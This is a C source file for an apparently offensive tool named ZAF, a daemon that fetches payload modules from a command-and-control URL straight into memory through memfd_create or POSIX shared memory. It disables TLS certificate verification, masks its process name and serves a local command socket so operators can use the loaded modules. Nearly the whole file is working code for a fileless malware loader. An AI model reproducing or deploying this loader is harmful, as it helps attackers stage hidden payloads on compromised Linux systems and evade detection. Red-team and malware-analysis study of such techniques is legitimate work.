/* 
 *                 === ZAF ===
 *
 *   Background daemon used to assist in loading remote modules in memory
 *   via several available METHODS and presenting them to out of process operators 
 *   for consumption 
 *
 *   METHODS: 
 *     1.POSIX shm_open
 *     2.memfd_create(2) 
 *
 *
 *   CAPABILITIES:
 *
 *
 * Ref: some code from https://x-c3ll.github.io/posts/fileless-memfd_create */


#define _GNU_SOURCE


#include <stdio.h>
#include <curl/curl.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <signal.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <errno.h>

#include "zaf.h"



// Returns a file descriptor where we can write our shared object
// TODO: refactor
int open_ramfs(Shared_Mem_Fd * smf) {

    int shm_fd = 0;
    char s[6] = {}; //TODO: parameterize

    gen_random(s, 6);//TODO: parameterize 

	if (memfd_kv_s.memfd_supp == 0) {
		shm_fd = shm_open(s, O_RDWR | O_CREAT, S_IRUSR|S_IRUSR|S_IRGRP|S_IRGRP|S_IRGRP|S_IRGRP);
		if (shm_fd < 0) { 
			log_fatal("RamWorker: shm_fd: Could not open file descriptor");
			return 0;
		}
        smf->shm_type=1; //shm
	}
	else {
		shm_fd = memfd_create(s, MFD_ALLOW_SEALING); // flags?
		if (shm_fd < 0) { 
			log_fatal("RamWorker: memfd_create: Could not open file descriptor\n");
			return 0;
		}
        smf->shm_type=2; //memfd
	}

    smf->shm_fd=shm_fd;
    memcpy(smf->shm_mname, s, 6);//TODO: parameterize
	return shm_fd;
}

// Download payload from a C&C via HTTPs
// TODO: refactor
int download_to_RAM(char *downloadUrl, char *fileName) { 

	CURL *curl;
	CURLcode res;
	int shm_fd = 0;
    FILE * shm_file;
    Shared_Mem_Fd shm_fd_s = {
        .shm_fd=0, 
        .shm_fname={0}, 
        .shm_mname={0}, 
        .shm_type=0 
    };

    // Save fileName in object record
    if ( strlen(fileName) < SHM_NAME_MAX ){
        memcpy(shm_fd_s.shm_fname, fileName, strlen(fileName) );
    }else{
        memcpy(shm_fd_s.shm_fname, fileName, SHM_NAME_MAX -1 );
    }

    // TODO: decide between shm_fd and status as return since we set up shm_fd via the struct passed in
	shm_fd = open_ramfs(&shm_fd_s); // Give me a file descriptor to memory

    if ( shm_fd == 0 || shm_fd_s.shm_fd == 0){ // memory not allocated - return
	    log_debug("RamWorker: File Descriptor Shared Memory NOT created! Bailing.");
        return shm_fd;
    }

	log_info("RamWorker: File Descriptor %d Shared Memory created", shm_fd_s.shm_fd);
	log_debug("RamWorker: Passing URL to cURL: %s", downloadUrl);

    // TODO: parameterize to HTTP/HTTPS/etc.
    // TODO: test HTTPS, check cert validation
    curl_global_init(CURL_GLOBAL_DEFAULT);    
	curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, downloadUrl);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
		curl_easy_setopt(curl, CURLOPT_USERAGENT, ZCURL_AGENT);
       
        // WARNING: fdopen(3) The result of applying fdopen() to a shared memory object is undefined. 
        // So far works but TODO: test across platforms. Most likely file semantics are preserved
        // but the behavior is undefined due to fcntl things like SEALS
        shm_file=fdopen(shm_fd_s.shm_fd, "w"); 
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, shm_file); 
		
		res = curl_easy_perform(curl);
		if (res != CURLE_OK && res != CURLE_WRITE_ERROR) {
			log_error("cURL: cURL failed: %s", curl_easy_strerror(res));
            cleanup_mod_resources(shm_fd);
            return 0;
		}
		curl_easy_cleanup(curl);
		return shm_fd;
	}

    return shm_fd;
}


int setMemfdTbl(int shm_fd, char* mname) {
    char path[1024]; // TODO: what should this be?
    char mstate[] = "L"; //Loaded
    
    // TODO: Allow commands to seal the modules that would never be modified
    //unsigned int seals =  F_SEAL_GROW | F_SEAL_SHRINK | F_SEAL_WRITE | F_SEAL_SEAL;
    unsigned int seals =  F_SEAL_SEAL;

    log_debug("MemTbl: Populating Index Table");
    if (memfd_kv_s.memfd_supp == 1) { 

	    log_debug("MemTbl: memfd_create() is supported.");
	    log_debug("MemTbl: Sealing modules.");
        if (fcntl(shm_fd, F_ADD_SEALS, seals) == -1)
	        log_error("MemTbl: fcntl(): Sealing modules failed");

        snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
    } else { 
        snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd); 
	    log_debug("MemTbl: only /dev/shm supported.");
    }

    if (check_empty(head) == 0) {
        log_debug("Memtbl: Head of list empty");
        head = calloc(1,sizeof(node_t));
        if (head == NULL) {
		    log_fatal("MemTble: calloc() failed");
            return 1;
        }
        push_first(head, shm_fd, path, mname, mstate);
    }else{
        push(head, shm_fd, path, mname, mstate);
    }
    return 0;
}


int main (int argc, char **argv) {

    argv = save_ps_display_args(argc, argv);
    init_ps_display(ZPS_NAME); // TODO: parmeterize

    fp = fopen (logFile,"w");
    if (fp == NULL) {
        log_error("Main: Log File not created okay, errno = %d", errno);
    }else{
        log_set_fp(fp); 
        //log_set_level(2); //  "TRACE", "DEBUG", >"INFO"<, "WARN", "ERROR", "FATAL"
        log_set_level(ZLOG_LEVEL);  // TODO: paramterize
        log_set_quiet(logquiet); // TODO: parameterize
    }

	log_info("=== ZAF ===\n"); // parameterize
    //backgroundDaemonLeader();
    doWork();

    fclose (fp);
	return 0;
}

void doWork(){

    char urlbuf[255] = {'\0'}; // TODO: what should this be?
    int  i;

    if (checKernel() == 1){
	    log_info("Worker: memfd_create() support seems to be available.");
    }else{
	    log_info("Worker: /dev/shm fallback. memfd_create() support is not available.");
    }

    log_debug("Worker: Trying for C2 download initial modules (if any)...");

    for(i = 0; i < sizeof(modules)/sizeof(modules[0]); i++)
    {
        snprintf(urlbuf, sizeof(urlbuf), "%s%s", ccurl, modules[i]);
        log_debug("Worker: Module URL = %s", urlbuf);
        load_mod(head, urlbuf);
    }
    
    setupCmdP();

}

int setupCmdP(){

    // TODO: Allow Unix domain sockets
    unsigned int portno, clilen, sockfd, newsockfd;
    struct sockaddr_in serv_addr, cli_addr; // AF_INET
    // struct sockaddr_un serv_addr_un; // AF_UNIX
    int one = 1;

    /* First call to socket() function */
    sockfd = socket(AF_INET, SOCK_STREAM, 0); // AF_INET
    // sockfd = socket(AF_UNIX, SOCK_STREAM, 0);   // AF_UNIX

    if (sockfd < 0) {
      log_error("Error opening socket()");
      return -1;
    }


    bzero((char *) &serv_addr, sizeof(serv_addr));
    portno = 0; // random port // TODO: parameterize

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(0x7f000001L); // 127.0.0.1 // TODO: parameterize
    serv_addr.sin_port = htons(portno);

    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
      log_error("Error on bind()");
      return -1; // TODO: make a pass to check all return codes to make them consistent
    }
    setsockopt(sockfd, SOL_TCP, TCP_NODELAY, &one, sizeof(one));
    listen(sockfd,5); // TODO: paramterize

    log_info("Listening on port"); // TODO: provide the port
    clilen = sizeof(cli_addr);

    /* AF_UNIX 
    bzero((char *) &serv_addr_un, sizeof(serv_addr_un));
    strcpy(serv_addr_un.sun_path, "/tmp/zsock");
    listen(sockfd,5);
    */

    while (1) {
        
      log_info("Accepting requests");
      newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);

      if (newsockfd < 0) {
         log_error("Error on accept()");
         continue;
      }

      // We are not forking as we want to to preserve the PID for /proc/ FD's
      processCommandReq(newsockfd, head);
      close(newsockfd);
    }

    return 0;
}

